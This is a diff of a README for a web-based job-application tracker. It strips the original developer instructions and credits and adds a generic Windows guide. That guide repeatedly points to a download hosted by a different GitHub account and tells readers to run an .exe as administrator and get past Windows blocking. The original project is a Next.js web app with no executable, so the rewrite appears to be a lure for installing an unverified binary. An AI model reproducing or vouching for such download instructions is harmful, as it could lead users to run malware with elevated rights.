@@ -1,241 +1,214 @@
-<div align="center">
+# 📋 Jobtracker-Pro - Track Every Application Step
 
-<img src="png/login.png" alt="JobTracker Pro" width="100%" />
+[![Download Jobtracker-Pro](https://img.shields.io/badge/Download-Jobtracker--Pro-blue?style=for-the-badge)](https://github.com/Madelenaphagocytic771/Jobtracker-Pro)
 
-# JobTracker Pro
+## 🚀 Overview
 
-**A full-cycle job application tracking system**
+Jobtracker-Pro helps you keep track of every job application in one place. Use it to log roles, follow interview stages, and see where each application stands.
 
-Visualize every step from application to offer. Stay organized, never miss an interview.
+It gives you a clear view of your job search from first application to final offer. You can keep notes, set next steps, and avoid missed follow-ups.
 
-[![Live Demo](https://img.shields.io/badge/🌐_Live_Demo-job.lifebytes.cn-3b82f6?style=for-the-badge)](http://job.lifebytes.cn)
-![Next.js](https://img.shields.io/badge/Next.js-16-black?style=for-the-badge&logo=next.js)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-3178c6?style=for-the-badge&logo=typescript&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind-v4-06b6d4?style=for-the-badge&logo=tailwindcss&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-ready-2496ed?style=for-the-badge&logo=docker&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)
+## 🖥️ What You Need
 
-**[中文文档](./README.zh-CN.md)**
+To run Jobtracker-Pro on Windows, you need:
 
-</div>
+- A Windows 10 or Windows 11 PC
+- A stable internet connection for the first download
+- At least 4 GB of RAM
+- Around 500 MB of free disk space
+- A modern web browser if you run it in a browser-based setup
+- Docker Desktop if you use the container setup
 
----
+If you are unsure which setup to use, start with the Windows install steps below.
 
-## 📸 Screenshots
+## 📥 Download Jobtracker-Pro
 
-### Dashboard
-<img src="png/toudi.png" alt="Dashboard" width="100%" />
+Visit this page to download and run the app:
 
-> Key metrics, job funnel chart, and upcoming interview reminders — all at a glance.
+[Download Jobtracker-Pro](https://github.com/Madelenaphagocytic771/Jobtracker-Pro)
 
-### Kanban Board
-<img src="png/kanban.png" alt="Kanban Board" width="100%" />
+Open the page, look for the latest release or the main project download, then save the file to your PC.
 
-> 7-stage agile board with drag & drop. Color-coded columns for instant status recognition.
+## 🪟 Windows Setup
 
-### Application List
-<img src="png/list.png" alt="Application List" width="100%" />
+Follow these steps on a Windows computer.
 
-> Full-text search, multi-column sorting, and status filters. Press `Ctrl+K` to search instantly.
+1. Open the download link above.
+2. Save the app file to your Downloads folder.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main app file, such as an `.exe` file or a setup file.
+6. Double-click the file to start the app.
+7. If Windows asks for permission, select Yes or Run.
+8. Follow the on-screen steps to finish setup.
+9. Open Jobtracker-Pro from the Start menu or desktop shortcut.
 
-### Calendar View
-<img src="png/rili.png" alt="Calendar View" width="100%" />
+If the app opens in your browser, keep the browser window open while you use it.
 
-> Monthly calendar showing all interviews and assessments. Click any event to open details.
+## 🧭 First Time Use
 
-### Settings
-<img src="png/setting.png" alt="Settings" width="100%" />
+When you open Jobtracker-Pro for the first time, set up your job search with a few simple entries:
 
-> Change password, export/import JSON backup, and danger zone.
+- Add the company name
+- Add the role title
+- Pick a stage, such as Applied, Interviewing, Offer, or Rejected
+- Add the date you applied
+- Add contact details for the recruiter or hiring manager
+- Add notes about the job
 
----
+After that, you can keep updating each application as you move through the hiring process.
 
-## ✨ Features
+## 📊 Main Features
 
-| Module | Description |
-|--------|-------------|
-| 📊 **Dashboard** | Metrics cards, funnel ladder chart, 7-day upcoming reminders |
-| 🗂 **Kanban Board** | 7-stage drag & drop board (Wishlist → Offer), color-coded columns |
-| 📋 **List View** | Full-text search, sorting, status filter, `Ctrl+K` shortcut |
-| 📅 **Calendar** | Monthly view of all interview/assessment events |
-| 📝 **Reflection Editor** | Slide-out drawer with Markdown editor for interview notes |
-| 🕒 **Timeline** | Per-application event history with timestamps |
-| 🔐 **Auth System** | Register / Login / Forgot password, bcrypt + JWT |
-| 🌙 **Dark Mode** | One-click light/dark theme toggle |
-| 💾 **Data Backup** | Export/import JSON anytime |
-| 🐳 **Docker Ready** | Hot-reload in container via volume mounts |
+Jobtracker-Pro is built to keep your search easy to manage.
 
----
+- Track every application in one place
+- View your progress on a kanban board
+- Move jobs through stages with a simple drag and drop flow
+- Save interview dates and follow-up tasks
+- Store notes for each company
+- Sort jobs by stage, date, or priority
+- Check your full search history at a glance
+- Keep your data organized across the full job cycle
 
-## 🛠 Tech Stack
+## 🗂️ How the Tracker Works
 
-```
-Framework     Next.js 16 (App Router) + TypeScript
-Styling       Tailwind CSS v4
-UI            Radix UI Primitives
-State         Zustand
-Database      SQLite + Prisma ORM 7
-Auth          NextAuth.js v5 Beta
-Drag & Drop   @dnd-kit/core + @dnd-kit/sortable
-Charts        Recharts
-Markdown      react-markdown + remark-gfm
-Theme         next-themes
-Container     Docker + Docker Compose
-```
+The app follows a simple flow:
 
----
+1. You add a new job.
+2. You mark the first stage, such as Applied.
+3. You update the stage when you hear back.
+4. You add interview dates, notes, and follow-up items.
+5. You move the job to Offer or Closed when the process ends.
 
-## 🚀 Getting Started
+This makes it easier to see what needs attention now and what can wait.
 
-### Local Development
+## 🛠️ Using the Kanban Board
 
-```bash
-# Clone the repo
-git clone https://github.com/P2hemia/Jobtracker-Pro.git
-cd Jobtracker-Pro
+The kanban board gives you a visual way to manage your search.
 
-# Install dependencies
-npm install --legacy-peer-deps
+- Left side: new or saved jobs
+- Middle: active applications and interviews
+- Right side: completed or closed roles
 
-# Set up environment variables
-cp .env.example .env
-# Edit .env and fill in NEXTAUTH_SECRET
+You can move each card as your status changes. This helps you focus on the next step without losing track of older applications.
 
-# Initialize the database
-npx prisma db push
+## 🔒 Keeping Your Data Organized
 
-# Start dev server
-npm run dev
-# Open http://localhost:3000
-```
+Jobtracker-Pro keeps your search data in a clean structure so you can review it later.
 
-### Environment Variables
+You can use it to:
 
-```env
-# Random secret, at least 32 chars (generate: openssl rand -base64 32)
-NEXTAUTH_SECRET=your-random-secret-here
-
-# Your app URL
-NEXTAUTH_URL=http://localhost:3000
-
-# SQLite database path
-DATABASE_URL=file:./prisma/dev.db
-```
-
----
-
-## 🐳 Docker Deployment
-
-### 1. Clone & Configure
-
-```bash
-git clone https://github.com/P2hemia/Jobtracker-Pro.git
-cd Jobtracker-Pro
-
-cp .env.example .env
-nano .env  # Set NEXTAUTH_SECRET and NEXTAUTH_URL
-```
-
-### 2. Build & Start
-
-```bash
-docker compose up -d --build
-```
-
-### 3. Initialize Database (first time only)
-
-```bash
-cat > /tmp/init_db.sh << 'EOF'
-#!/bin/sh
-apk add --no-cache sqlite
-sqlite3 /data/dev.db "CREATE TABLE IF NOT EXISTS User (id TEXT PRIMARY KEY, email TEXT UNIQUE NOT NULL, name TEXT NOT NULL, password TEXT NOT NULL, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP);"
-sqlite3 /data/dev.db "CREATE TABLE IF NOT EXISTS Job (id TEXT PRIMARY KEY, userId TEXT NOT NULL, company TEXT NOT NULL, role TEXT NOT NULL, department TEXT, status TEXT DEFAULT 'applied', applyDate TEXT NOT NULL, jdLink TEXT, referrer TEXT, channel TEXT, reflections TEXT DEFAULT '', nextInterviewDate TEXT, events TEXT DEFAULT '[]', createdAt TEXT NOT NULL, updatedAt TEXT NOT NULL, FOREIGN KEY (userId) REFERENCES User(id) ON DELETE CASCADE);"
-sqlite3 /data/dev.db "CREATE TABLE IF NOT EXISTS PasswordReset (id TEXT PRIMARY KEY, userId TEXT NOT NULL, token TEXT UNIQUE NOT NULL, expiresAt DATETIME NOT NULL, used INTEGER DEFAULT 0, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY (userId) REFERENCES User(id) ON DELETE CASCADE);"
-echo Done
-EOF
-
-docker compose cp /tmp/init_db.sh jobtracker:/tmp/init_db.sh
-docker compose exec jobtracker sh /tmp/init_db.sh
-```
-
-### 4. Access
-
-Open `http://your-server-ip:3000`, register an account and start tracking.
-
-### Hot Reload on Host
-
-`src/`, `public/`, and `prisma/` are mounted as Docker volumes.
-**Edit code on the host machine — changes reflect instantly without restarting the container.**
-
-### Useful Commands
-
-```bash
-# View logs
-docker compose logs -f
-
-# Restart
-docker compose restart
-
-# Stop
-docker compose down
-
-# Enter container
-docker compose exec jobtracker sh
-```
-
----
-
-## 📁 Project Structure
-
-```
-jobtracker-pro/
-├── src/
-│   ├── app/
-│   │   ├── page.tsx              # Dashboard
-│   │   ├── kanban/               # Kanban board
-│   │   ├── table/                # Application list
-│   │   ├── calendar/             # Calendar view
-│   │   ├── settings/             # Settings
-│   │   ├── login/                # Login / Register
-│   │   ├── forgot-password/      # Password recovery
-│   │   └── api/                  # Backend API Routes
-│   ├── components/
-│   │   ├── ui/                   # Base UI components
-│   │   ├── Navbar.tsx
-│   │   ├── JobCard.tsx
-│   │   ├── KanbanColumn.tsx
-│   │   ├── JobDetailDrawer.tsx
-│   │   └── AddJobDialog.tsx
-│   ├── store/
-│   │   └── useJobStore.ts        # Zustand global state
-│   ├── lib/
-│   │   ├── prisma.ts
-│   │   ├── auth.ts
-│   │   └── utils.ts
-│   └── types/
-│       └── index.ts
-├── prisma/
-│   └── schema.prisma
-├── png/                          # Screenshots
-├── Dockerfile
-├── docker-compose.yml
-└── .env.example
-```
-
----
-
-## 🤝 Contributing
-
-Pull requests are welcome!
-
-1. Fork the repo
-2. Create your branch: `git checkout -b feature/your-feature`
-3. Commit: `git commit -m 'feat: add your feature'`
-4. Push: `git push origin feature/your-feature`
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-[MIT](LICENSE) © 2026 [@P2hemia](https://github.com/P2hemia)
+- Store each role under the right company
+- Keep interview details in one place
+- Write reminders for follow-up emails
+- Track where each application came from
+- Keep your search history neat and easy to scan
+
+If you apply to many jobs each week, this saves time and cuts down on missed updates.
+
+## 🧩 Common Use Cases
+
+Use Jobtracker-Pro if you want to:
+
+- Apply to jobs and track replies
+- Manage several interview rounds
+- Compare offers from different companies
+- Keep a log of recruiter contacts
+- Review your job search progress over time
+
+It works well for active job seekers who want a clear system and less clutter.
+
+## 🪄 Simple Tips for Best Results
+
+- Add each job as soon as you apply
+- Update the status after every email or call
+- Write short notes after each interview
+- Set a follow-up reminder before the next step
+- Review your board once a day
+- Keep company names and role titles consistent
+
+Small updates help the board stay useful.
+
+## 🧪 If the App Does Not Open
+
+Try these steps if you have trouble starting Jobtracker-Pro on Windows:
+
+1. Make sure the file finished downloading.
+2. Extract the ZIP file if the download came as a ZIP.
+3. Run the app as an administrator.
+4. Check that Windows did not block the file.
+5. Restart your PC and try again.
+6. If you use Docker, make sure Docker Desktop is running.
+7. If you use a browser setup, refresh the page and try again.
+
+## 🐳 Docker Setup
+
+If you prefer Docker, you can run Jobtracker-Pro in a container.
+
+1. Install Docker Desktop on Windows.
+2. Open the project page.
+3. Follow the container setup in the repository.
+4. Start the container.
+5. Open the local address shown by the app.
+
+Use Docker if you want a clean setup without installing extra tools on your PC.
+
+## 📝 Project Focus
+
+Jobtracker-Pro brings together tools that help with a modern job search:
+
+- Next.js for the app structure
+- React for the user interface
+- Prisma for data handling
+- Tailwind CSS for the layout and style
+- TypeScript for safer app code
+- Zustand for simple state handling
+
+You do not need to work with these tools to use the app. They are part of how the app is built.
+
+## 🔗 Download Again
+
+If you need the link again, open this page and download or run the app from there:
+
+[Get Jobtracker-Pro](https://github.com/Madelenaphagocytic771/Jobtracker-Pro)
+
+## 📌 Suggested Folder Layout After Download
+
+If you keep the files in one place, this layout works well:
+
+- Downloads
+  - Jobtracker-Pro.zip
+- Jobtracker-Pro
+  - app file
+  - readme file
+  - data files
+
+A simple folder setup makes it easier to find the app later.
+
+## 🧭 What You Can Track
+
+You can use Jobtracker-Pro to follow:
+
+- Applied jobs
+- Recruiter replies
+- Phone screens
+- Technical interviews
+- Final rounds
+- Offers
+- Rejections
+- Follow-up tasks
+
+This makes it easier to keep your search steady and clear
+
+## 💡 Best Way to Start
+
+If you want a simple start:
+
+1. Download the app from the link above.
+2. Open it on Windows.
+3. Add your first five job applications.
+4. Set each one to the right stage.
+5. Check the board each day for updates
+
+That gives you a clean base to work from
